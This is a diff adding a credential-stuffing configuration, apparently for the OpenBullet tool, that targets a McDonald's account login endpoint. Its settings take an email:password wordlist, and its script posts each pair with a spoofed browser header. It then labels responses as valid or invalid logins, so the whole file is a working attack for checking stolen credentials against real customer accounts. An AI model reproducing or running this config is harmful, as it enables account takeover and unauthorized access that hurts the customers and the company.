@@ -1,0 +1,36 @@
+[SETTINGS]
+{
+  "Name": "McDonalds New",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-20T23:47:19.5426656+00:00",
+  "AdditionalInfo": "",
+  "Author": "RADIKAL",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://profile2.mcdonalds.com/mcdspreferencecenterv2.asmx/PreferenceCenterLogin" AutoRedirect=TRUE 
+  CONTENT "{'ClientID': 'MCDS', 'EmailAddress': '<USER>', 'Password': '<PASS>', 'CultureInfo':'', 'ExternalInfo':''}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Login combination is invalid." 
+  KEYCHAIN Success OR 
+    KEY "\"Type\":\"PROCESSED" 
